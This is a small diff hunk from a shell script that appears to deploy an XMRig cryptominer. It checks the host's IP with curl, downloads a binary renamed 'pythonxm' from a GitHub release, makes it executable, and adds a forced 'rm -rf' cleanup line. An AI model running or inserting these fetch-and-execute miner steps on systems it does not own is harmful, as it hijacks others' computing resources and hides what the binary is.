@@ -18,6 +18,8 @@ curl ipinfo.io
 ########## CPU ##########
 ####### XM
 #               Executable
+echo > ooutx
+rm -rf pythonxm
 wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
 chmod +x pythonxm
 #                Config
